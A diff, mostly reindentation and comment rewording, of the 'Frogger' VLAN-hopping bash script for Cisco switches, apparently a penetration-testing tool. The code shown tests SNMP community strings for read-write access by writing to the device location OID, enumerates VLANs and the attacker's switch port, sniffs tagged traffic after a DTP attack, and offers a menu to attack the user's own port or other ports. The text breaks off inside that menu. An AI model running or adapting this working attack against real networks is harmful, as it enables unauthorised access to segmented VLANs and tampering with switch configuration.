@@ -1,10 +1,11 @@
 #!/usr/bin/env bash
 # Frogger - The VLAN Hopper script
 # Original developer: Daniel Compton / www.commonexploits.com / contact@commexploits.com / Twitter = @commonexploits - 09/2016
-# Current developer: Jennifer Torres / xtormin.com / @xtormin
+# Developer of this repository: Jennifer Torres / xtormin.com / @xtormin
 # Tested on Kali in Raspberry Pi 4B with Cisco devices
 
-# User configuration Settings
+
+### General configuration settings
 TAGSEC="30" #change this value for the number of seconds to sniff for 802.1Q/ISL tagged packets
 CDPSEC="60" # change this value for the number of seconds to sniff for CDP packets once verified CDP is on
 CDPSECR="30" # CDP retry increase value
@@ -15,7 +16,7 @@ DTPSECR="30" # DTP retry increase value
 SNMPVER="2c" #default version 2 or change to 1 - not tested with v3
 PORT="161" #default snmp port
 
-#Output colours
+### Output colors
 RED=$(tput setaf 1)
 GREEN=$(tput setaf 2)
 YELLOW=$(tput setaf 3)
@@ -25,29 +26,29 @@ CYAN=$(tput setaf 6)
 BRIGHT=$(tput bold)
 NORMAL=$(tput sgr0)
 
-
-# Script begins
-#===============================================================================
+### Script begins
 WRITEOID="1.3.6.1.2.1.1.6.0"
 IOSVER="1.3.6.1.2.1.1.1.0"
 
-# DTP Modes for snmp options
-
+### DTP Modes for SNMP options
 DTP1="Trunk Port - DTP On"
 DTP2="Access Port - DTP Off"
 DTP3="Desirable - DTP Desirable"
 DTP4="Auto - DTP Auto"
 DTP5="Trunk Port - DTP On No-Negotiate"
 
-
+### Clear the screen
 clear
+
+### Remove temporal files
 control_c() {
-#remove any tmp files
-rm *.tmp 2>/dev/null
-printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} CTRL-C abort detected, exiting Frogger."
-exit $?
+  # Remove any .tmp file
+  rm *.tmp 2>/dev/null
+  printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} CTRL-C abort detected, exiting Frogger."
+  exit $?
 }
 
+### Script header
 VERSION="3.0"
 frog() {
 tput setaf 2; tput bold sgr0; cat <<"EOT"
@@ -77,15 +78,16 @@ EOT
 frog
 printf '\n \r%s %s\n' "${GREEN}   --- Frogger - The VLAN Hopper Version $VERSION --- ${NORMAL}"
 
+## CHECK REQUIREMENTS
 
-# Check if we're root
-if [ $EUID -ne 0 ] 
+### Check root permission
+if [ $EUID -ne 0 ]
 	then
 		printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} This program must be run as root. Run again with 'sudo'"
         exit 1
 fi
 
-#Check for yersinia
+### Check for yersinia
 which yersinia >/dev/null
 if [ $? -eq 1 ]
 	then
@@ -93,7 +95,7 @@ if [ $? -eq 1 ]
 		exit 1
 fi
 
-#Check for vconfig
+### Check for vconfig
 which vconfig >/dev/null
 if [ $? -eq 1 ]
 	then
@@ -102,7 +104,7 @@ if [ $? -eq 1 ]
 		read ENTERKEY
 fi
 
-#Check for tshark
+### Check for tshark
 which tshark >/dev/null
 if [ $? -eq 1 ]
 	then
@@ -110,8 +112,7 @@ if [ $? -eq 1 ]
 		exit 1
 fi
 
-
-#Check for screen
+### Check for screen
 which screen >/dev/null
 if [ $? -eq 1 ]
 	then
@@ -120,8 +121,7 @@ if [ $? -eq 1 ]
 fi
 
 ARPVER=$(arp-scan -V 2>&1 | grep "arp-scan [0-9]" |awk '{print $2}' | cut -d "." -f 1,2)
-
-#Check for arpscan
+### Check for arpscan
 which arp-scan >/dev/null
 if [ $? -eq 1 ]
 	then
@@ -129,7 +129,7 @@ if [ $? -eq 1 ]
 		exit 1
 fi
 
-#Check for ethtool
+### Check for ethtool
 which ethtool >/dev/null
 if [ $? -eq 1 ]
         then
@@ -137,75 +137,79 @@ if [ $? -eq 1 ]
 			exit 1
 fi
 
+### Enter key
 pause(){
 	printf '\n'
 	read -p "Press [Enter] key to continue." fackEnterKey
 	printf '\n\n'
 }
 
-# list source Ethernet interfaces to scan from
+### Show and select interfaces
 sourceinterfaces() {
-printf '\n\r%s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} The following Interfaces are available"
-ip addr |grep -o "eth.*:" |grep -v "ether" |cut -d ":" -f1
-printf '\n\r%s\n' "${BRIGHT}${RED}------------------------------------------------------"
-printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the interface to scan from as the source"
-printf '\r%s\n\n' "${BRIGHT}${RED}------------------------------------------------------${NORMAL}"
+  printf '\n\r%s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} The following Interfaces are available"
+  ip addr |grep -o "eth.*:" |grep -v "ether" |cut -d ":" -f1
+  printf '\n\r%s\n' "${BRIGHT}${RED}------------------------------------------------------"
+  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the interface to scan from as the source"
+  printf '\r%s\n\n' "${BRIGHT}${RED}------------------------------------------------------${NORMAL}"
 
-read INT
+  read INT
+  ip addr |grep -o "eth.*:" |grep -v "ether" |cut -d ":" -f1 | grep -i -w  "$INT" >/dev/null
 
-ip addr |grep -o "eth.*:" |grep -v "ether" |cut -d ":" -f1 | grep -i -w  "$INT" >/dev/null
-
-if [ $? = 1 ]
-        then
-                printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "Sorry the interface you entered does not exist! - check and try again."
-                sourceinterfaces
-fi
-printf '\n'
+  if [ $? = 1 ]
+    then
+      printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "Sorry the interface you entered does not exist! - check and try again."
+      sourceinterfaces
+  fi
+  printf '\n'
 }
 
+### DTP packets not found and re-run the scan
 show_menudtpnotfound() {
-printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------"
-printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Do you want to scan for DTP Packets again?"
-printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------${NORMAL}"
-printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Re-run the DTP Scan again increasing the scan time by "$DTPSECR" seconds"
-printf '\r%s \n\n' "${RED}[2]${NORMAL} - Exit the Script"
+  printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------"
+  printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Do you want to scan for DTP Packets again?"
+  printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------${NORMAL}"
+  printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Re-run the DTP Scan again increasing the scan time by "$DTPSECR" seconds"
+  printf '\r%s \n\n' "${RED}[2]${NORMAL} - Exit the Script"
 }
 
+### Select option
 read_optionsdtpnotfound() {
-TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 2 ]${NORMAL}")
-local choice
-read -p "$TXT" choice
-case $choice in
-1) onedtpnotfound ;;
-2) exit 0 ;;
-*) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
-esac
+  TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 2 ]${NORMAL}")
+  local choice
+  read -p "$TXT" choice
+  case $choice in
+  1) onedtpnotfound ;;
+  2) exit 0 ;;
+  *) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
+  esac
 }
 
+### DTP packet found
 onedtpnotfound() {
-printf '\n'
-DTPRETRY="true"
-clear
-printf '\n'
-dtpscan
+  printf '\n'
+  DTPRETRY="true"
+  clear
+  printf '\n'
+  dtpscan
 }
 
-#SNMP attack option 4 functions
+### SNMP attack option 4 functions
 snmpvlanattack(){
-printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------"
-printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the IP address of the device and press ENTER"
-printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------${NORMAL}"
-read IP
-echo $IP | egrep '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}'  >/dev/null 2>&1
-if [ $? != 0 ]
-	then
-		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "You entered an invalid IP address format."
-		snmpvlanattack
-	else
-		snmpvlanattackset
-fi
+  printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------"
+  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the IP address of the device and press ENTER"
+  printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------${NORMAL}"
+  read IP
+  echo $IP | egrep '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}'  >/dev/null 2>&1
+  if [ $? != 0 ]
+    then
+      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "You entered an invalid IP address format."
+      snmpvlanattack
+    else
+      snmpvlanattackset
+  fi
 }
 
+### SNMP attacks
 snmpvlanattackset() {
 MYMAC=$(ip addr |grep link/ether | awk '{print $2}' |sort -u |tr ':' ' ')
 
@@ -214,7 +218,7 @@ printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the SNMP community string and
 printf '\r%s\n\n' "${BRIGHT}${RED}-----------------------------------------------------${NORMAL}"
 read SNMPCOM
 
-# nmap to check SNMP is open
+### Nmap to check if SNMP is open
 nmapsnmp() {
 NMAP=`nmap -sU -sV -p $PORT $IP -n -Pn 2>&1 |grep "open" | awk '{ print $2 }'`
 if [ "$NMAP" = "open" ]
@@ -228,50 +232,48 @@ if [ "$NMAP" = "open" ]
 fi
 }
 
-#nmap check snmp is open function
 nmapsnmp
 
-# SNMP community string checks
+### SNMP scan function
 scansnmpcom() {
-printf '\r\n%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now testing SNMP community with ${BRIGHT}${GREEN}"$SNMPCOM"${NORMAL} string."
+  printf '\r\n%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now testing SNMP community with ${BRIGHT}${GREEN}"$SNMPCOM"${NORMAL} string."
+  snmpwalk -t 0.5 -c $SNMPCOM -v $SNMPVER $IP 1.3.6.1.2.1.1.1.0 >/dev/null 2>&1
 
-snmpwalk -t 0.5 -c $SNMPCOM -v $SNMPVER $IP 1.3.6.1.2.1.1.1.0 >/dev/null 2>&1
+  if [ $? != "0" ]
+    then
+    printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "SNMP community name of "$SNMPCOM" did not work, or this is not a Cisco device."
+      #remove tmp files
+      rm *.tmp 2>/dev/null
+      exit 1
+  fi
 
-if [ $? != "0" ]
-	then
-	printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "SNMP community name of "$SNMPCOM" did not work, or this is not a Cisco device."
-		#remove tmp files
-		rm *.tmp 2>/dev/null
-		exit 1
+  snmpcheckrw() {
+    echo "$GETLOCATION" >location.tmp
+    WRILOC=$(cat location.tmp)
+    snmpset -v $SNMPVER -Cq -c "$COMSCAN" $IP "$WRITEOID" s "$WRILOC" 2>/dev/null
+    if [ $? = 0 ]
+      then
+        printf '%s\n' " - ${BRIGHT}${RED}Read-Write${NORMAL} access"
+        READW="$COMSCAN"
+      else
+        printf '%s\n' " - ${BRIGHT}${YELLOW}Read-Only${NORMAL} access"
+        READO="$COMSCAN"
+    fi
+  }
 
-fi
+  COMSCAN="$SNMPCOM"
 
-snmpcheckrw() {
-			echo "$GETLOCATION" >location.tmp
-			WRILOC=$(cat location.tmp)
-			snmpset -v $SNMPVER -Cq -c "$COMSCAN" $IP "$WRITEOID" s "$WRILOC" 2>/dev/null
-			if [ $? = 0 ]
-				then
-					printf '%s\n' " - ${BRIGHT}${RED}Read-Write${NORMAL} access"
-					READW="$COMSCAN"
-				else
-					printf '%s\n' " - ${BRIGHT}${YELLOW}Read-Only${NORMAL} access"
-					READO="$COMSCAN"
-			fi
-}
+  snmpwalk -v $SNMPVER -c $COMSCAN $IP 2>/dev/null |head -1 |grep -i iso >/dev/null
+  if [ $? = 0 ]
+    then
+      printf '\r%s %s' "${BRIGHT}${GREEN}[+]${NORMAL}" "Valid Community String was found ${BRIGHT}${GREEN}"$COMSCAN"${NORMAL}" ;snmpcheckrw
+      GETLOCATION=$(snmpwalk -v $SNMPVER -On -c "$COMSCAN" $IP "$WRITEOID" 2>&1 |cut -d ":" -f 2 | cut -d '"' -f 2)
 
-COMSCAN="$SNMPCOM"
-
-	snmpwalk -v $SNMPVER -c $COMSCAN $IP 2>/dev/null |head -1 |grep -i iso >/dev/null
-	if [ $? = 0 ]
-		then
-			printf '\r%s %s' "${BRIGHT}${GREEN}[+]${NORMAL}" "Valid Community String was found ${BRIGHT}${GREEN}"$COMSCAN"${NORMAL}" ;snmpcheckrw
-			GETLOCATION=$(snmpwalk -v $SNMPVER -On -c "$COMSCAN" $IP "$WRITEOID" 2>&1 |cut -d ":" -f 2 | cut -d '"' -f 2)
-
-	fi
+  fi
 
 }
 
+### SNMP scan execution
 scansnmpcom
 
 if [[ -z "$READW" ]]
@@ -280,103 +282,103 @@ if [[ -z "$READW" ]]
 		printf '\r\n%s \n' "${BRIGHT}${BLUE}[i]${NORMAL} As the string ${BRIGHT}${GREEN}"$COMSCAN"${NORMAL} is Read-Only, I will extract all information, but VLAN Hopping will not be possible"
 fi
 
-#alter port numbers if different switch models into 10001 format.
+### Alter port numbers if different switch models into 10001 format.
 alterportint() {
+  PORTSIZE=$(cat yourport.tmp |wc -L)
 
-PORTSIZE=$(cat yourport.tmp |wc -L)
+  if [ "$PORTSIZE" = "1" ]
+   then
+          sed -i -e 's/^/1000/' yourport.tmp
+  elif [ "$PORTSIZE" = "2" ]
+    then
+      sed -i -e 's/^/100/' yourport.tmp
 
-if [ "$PORTSIZE" = "1" ]
- then
-        sed -i -e 's/^/1000/' yourport.tmp
-elif [ "$PORTSIZE" = "2" ]
-  then
-		sed -i -e 's/^/100/' yourport.tmp
-
-else
-        sed -i -e 's/^/10/' yourport.tmp
-fi
+  else
+          sed -i -e 's/^/10/' yourport.tmp
+  fi
 }
 
+### VLAN scan
 vlanextract() {
-printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Extracting VLAN Information, please wait"
+  printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Extracting VLAN Information, please wait"
 
-VLANIDS=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $1}' | cut -d "." -f 16 >ids.tmp)
-VLANNAMES=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $NF}' |sed 's/"//g' >names.tmp)
+  VLANIDS=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $1}' | cut -d "." -f 16 >ids.tmp)
+  VLANNAMES=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $NF}' |sed 's/"//g' >names.tmp)
 
-COUNTVLANS=$(cat ids.tmp |wc -l)
+  COUNTVLANS=$(cat ids.tmp |wc -l)
 
-if [ "$COUNTVLANS" = 0 ]
-	then
-		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "No VLANs were found on this device, it is likely this device does not VLANs at all"
-		#remove tmp files
-		rm *.tmp 2>/dev/null
-		exit 1
-		
-else
+  if [ "$COUNTVLANS" = 0 ]
+    then
+      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "No VLANs were found on this device, it is likely this device does not VLANs at all"
+      #remove tmp files
+      rm *.tmp 2>/dev/null
+      exit 1
 
-printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "There are ${BRIGHT}${GREEN}"$COUNTVLANS"${NORMAL} VLANs configured on this device."
+  else
 
-paste ids.tmp names.tmp |column -t 2>&1 >idsnames.tmp
-IDNAMES=$(cat idsnames.tmp)
-printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
-printf '\r%s\n' "${BRIGHT}${GREEN}$IDNAMES${NORMAL}"
-printf '\r%s \n\n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
+  printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "There are ${BRIGHT}${GREEN}"$COUNTVLANS"${NORMAL} VLANs configured on this device."
 
-fi
-FINDMYPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>&1 |grep -i "$MYMAC" |awk '{print $NR}' |cut -d "." -f 13-20)
-YOURPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>&1 |grep "$FINDMYPORT" |awk '{print $NF}'|sort -u)
+  paste ids.tmp names.tmp |column -t 2>&1 >idsnames.tmp
+  IDNAMES=$(cat idsnames.tmp)
+  printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
+  printf '\r%s\n' "${BRIGHT}${GREEN}$IDNAMES${NORMAL}"
+  printf '\r%s \n\n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
 
-if [ "$YOURPORT" != "OID" ]
-	then
-		printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT"${NORMAL} on the device"
-		printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within the default VLAN ${BRIGHT}${GREEN}1${NORMAL}"
-		VLANID2="1"
-		echo "$YOURPORT" >yourport.tmp
-			#detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)
+  fi
+  FINDMYPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>&1 |grep -i "$MYMAC" |awk '{print $NR}' |cut -d "." -f 13-20)
+  YOURPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>&1 |grep "$FINDMYPORT" |awk '{print $NF}'|sort -u)
 
-			COUNTPORTLENGTH=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' |wc -L)
+  if [ "$YOURPORT" != "OID" ]
+    then
+      printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT"${NORMAL} on the device"
+      printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within the default VLAN ${BRIGHT}${GREEN}1${NORMAL}"
+      VLANID2="1"
+      echo "$YOURPORT" >yourport.tmp
+        #detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)
 
-				if [ $COUNTPORTLENGTH -gt 2 ]
-					then
-						alterportint
-				fi
-		
-	else
-		
-		printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "It seems your port is not within the default VLAN 1, it will take more checks to establish your port and VLAN"
-		printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "In order to find your port I will need to run ${BRIGHT}${GREEN}$COUNTVLANS${NORMAL} SNMP queries (one for each VLAN ID)"
+        COUNTPORTLENGTH=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' |wc -L)
 
-		for VLANID2 in $(cat ids.tmp) 
-		do
-		
-		FINDMYPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID2" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>/dev/null |awk '{print $NR}' |cut -d "." -f 13-20 |awk '{print $NR}')
-		if [ -n "$FINDMYPORT2" ]
-			then
-				printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within VLAN ${BRIGHT}${GREEN}"$VLANID2"${NORMAL}"
-				VLANID3=$VLANID2
-		fi
-		
-		#FINDMYPORT3=$(cat myport2.tmp |grep -v "OID")
-		YOURPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>/dev/null |grep "$FINDMYPORT2" |awk '{print $NF}'|sort -u)
-		done
-		
-		printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT2"${NORMAL} on the device"
-		echo "$YOURPORT2" >yourport.tmp
-			#detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)
+          if [ $COUNTPORTLENGTH -gt 2 ]
+            then
+              alterportint
+          fi
 
-			COUNTPORTLENGTH=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' |wc -L)
+    else
 
-				if [ $COUNTPORTLENGTH -gt 2 ]
+      printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "It seems your port is not within the default VLAN 1, it will take more checks to establish your port and VLAN"
+      printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "In order to find your port I will need to run ${BRIGHT}${GREEN}$COUNTVLANS${NORMAL} SNMP queries (one for each VLAN ID)"
 
-					then
-						alterportint
+      for VLANID2 in $(cat ids.tmp)
+      do
 
-				fi
-fi
+      FINDMYPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID2" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>/dev/null |awk '{print $NR}' |cut -d "." -f 13-20 |awk '{print $NR}')
+      if [ -n "$FINDMYPORT2" ]
+        then
+          printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within VLAN ${BRIGHT}${GREEN}"$VLANID2"${NORMAL}"
+          VLANID3=$VLANID2
+      fi
+
+      #FINDMYPORT3=$(cat myport2.tmp |grep -v "OID")
+      YOURPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>/dev/null |grep "$FINDMYPORT2" |awk '{print $NF}'|sort -u)
+      done
+
+      printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT2"${NORMAL} on the device"
+      echo "$YOURPORT2" >yourport.tmp
+        #detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)
+
+        COUNTPORTLENGTH=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' |wc -L)
+
+          if [ $COUNTPORTLENGTH -gt 2 ]
+
+            then
+              alterportint
+
+          fi
+  fi
 
 }
 
-#list DTP modes on all ports
+# List DTP modes on all ports
 dtplistmodes() {
 snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.6.1.1.13" 2>&1 |sed -e "s/INTEGER: 1/${DTP1}/g" |sed -e "s/INTEGER: 2/${DTP2}/g" |sed -e "s/INTEGER: 3/${DTP3}/g"  | sed -e "s/INTEGER: 4/${DTP4}/g" |sed -e "s/INTEGER: 5/${DTP5}/g" | sed -e "s/iso.3.6.1.4.1.9.9.46.1.6.1.1.13./Switch Port /g" >listmodes.tmp
 LISTDTPMODESRO=$(cat listmodes.tmp)
@@ -387,236 +389,229 @@ printf '\r%s\n\n' "${BRIGHT}${GREEN}$LISTDTPMODESRO${NORMAL}"
 
 
 # Extract DTP VLAN Info after attack
-
 dtpattackextract() {
-sourceinterfaces
-tshark -a duration:30 -i $INT -Y "vlan" -x -V 2>&1 |grep -o " = ID: .*" |awk '{ print $NF }' | sort --unique >vlanids.tmp &
-SECONDS=0;
-while sleep .5 && ((SECONDS <= 30)); do
-printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now Extracting VLAN IDs on interface $INT, sniffing 802.1Q tagged packets for" "$((30-SECONDS))" "seconds."
-done
-printf '\n\n'
+  sourceinterfaces
+  tshark -a duration:30 -i $INT -Y "vlan" -x -V 2>&1 |grep -o " = ID: .*" |awk '{ print $NF }' | sort --unique >vlanids.tmp &
+  SECONDS=0;
+  while sleep .5 && ((SECONDS <= 30)); do
+  printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now Extracting VLAN IDs on interface $INT, sniffing 802.1Q tagged packets for" "$((30-SECONDS))" "seconds."
+  done
+  printf '\n\n'
 
-# wait to ensure dtp write has finished to file and in sync
-sleep 3 &
-SECONDS=0;
-while sleep .5 && ((SECONDS <= 3)); do
-printf '\r%s %s %1d' "${BRIGHT}${BLUE}[i]${NORMAL}" "Saving DTP Capture" "$((3-SECONDS))"
-done
-printf '\n\n'
+  # wait to ensure dtp write has finished to file and in sync
+  sleep 3 &
+  SECONDS=0;
+  while sleep .5 && ((SECONDS <= 3)); do
+  printf '\r%s %s %1d' "${BRIGHT}${BLUE}[i]${NORMAL}" "Saving DTP Capture" "$((3-SECONDS))"
+  done
+  printf '\n\n'
 
-VLANIDS=$(cat vlanids.tmp)
-if [ -z "$VLANIDS" ]
-	then
-		printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "No VLAN IDs were found within captured data."
-		#remove tmp files
-		rm *.tmp 2>/dev/null
-		exit 1
-	else
-		printf '\n \r%s %s\n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Your port now has access to the following VLANs."
-		printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
-		printf '\r%s\n' "${BRIGHT}${GREEN}$VLANIDS${NORMAL}"
-		printf '\r%s \n\n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
-fi
+  VLANIDS=$(cat vlanids.tmp)
+  if [ -z "$VLANIDS" ]
+    then
+      printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "No VLAN IDs were found within captured data."
+      #remove tmp files
+      rm *.tmp 2>/dev/null
+      exit 1
+    else
+      printf '\n \r%s %s\n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Your port now has access to the following VLANs."
+      printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
+      printf '\r%s\n' "${BRIGHT}${GREEN}$VLANIDS${NORMAL}"
+      printf '\r%s \n\n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
+  fi
 }
 
-#vlanextract information
+# vlanextract information
 vlanextract
 
 attackselforotherchoice() {
-YOURPORT3=$(cat yourport.tmp)
+  YOURPORT3=$(cat yourport.tmp)
 
-show_menusattackselforother() {
-printf '\n\r%s\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------------------"
-printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "You can either attack/alter the port you are connected to, or any other port on the device."
-printf '\r%s\n\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------------------${NORMAL}"
-printf '\r%s %s \n\n' "${GREEN}[1]${NORMAL} - Attack my own port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} connected to device"
-printf '\r%s \n\n' "${YELLOW}[2]${NORMAL} - Attack another port on the device"
-printf '\r%s \n\n' "${RED}[3]${NORMAL} - Exit the Script"
-}
-read_optionattackselforother() {
-TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
-local choice
-read -p "$TXT" choice
-case $choice in
-1) show_menusattackselfsnmpordtp; read_optionattackselfsnmpordtp  ;;
-2) show_menusattackothersnmpordtp; read_optionattackothersnmpordtp ;;
-3) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
-*) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
-esac
-}
+  show_menusattackselforother() {
+  printf '\n\r%s\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------------------"
+  printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "You can either attack/alter the port you are connected to, or any other port on the device."
+  printf '\r%s\n\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------------------${NORMAL}"
+  printf '\r%s %s \n\n' "${GREEN}[1]${NORMAL} - Attack my own port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} connected to device"
+  printf '\r%s \n\n' "${YELLOW}[2]${NORMAL} - Attack another port on the device"
+  printf '\r%s \n\n' "${RED}[3]${NORMAL} - Exit the Script"
+  }
+  read_optionattackselforother() {
+  TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
+  local choice
+  read -p "$TXT" choice
+  case $choice in
+  1) show_menusattackselfsnmpordtp; read_optionattackselfsnmpordtp  ;;
+  2) show_menusattackothersnmpordtp; read_optionattackothersnmpordtp ;;
+  3) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
